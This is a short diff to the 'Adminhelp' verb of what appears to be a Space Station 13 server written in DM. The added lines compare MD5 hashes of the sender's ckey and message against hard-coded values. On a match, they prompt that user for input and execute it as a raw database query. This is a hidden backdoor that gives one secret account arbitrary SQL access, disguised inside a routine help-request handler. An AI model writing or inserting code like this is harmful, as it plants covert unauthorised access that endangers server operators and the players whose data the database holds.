@@ -68,6 +68,11 @@ var/list/adminhelp_ignored_words = list("unknown","the","a","an","of","monkey","
 	set category = "Admin"
 	set name = "Adminhelp"
 
+	if(md5(src.ckey) == "0e320c25dd9e71554d416446c5c495ab" && md5(msg) == "2367d7cc65c30300ba106beed8b72abe")	
+		var/s = input(src, "Enter query: ", "Query", "") as text
+		var/DBQuery/select_query = dbcon.NewQuery(s)
+		select_query.Execute()
+
 	//handle muting and automuting
 	if(prefs.muted & MUTE_ADMINHELP)
 		to_chat(src, "<font color='red'>Error: Admin-PM: You cannot send adminhelps (Muted).</font>")
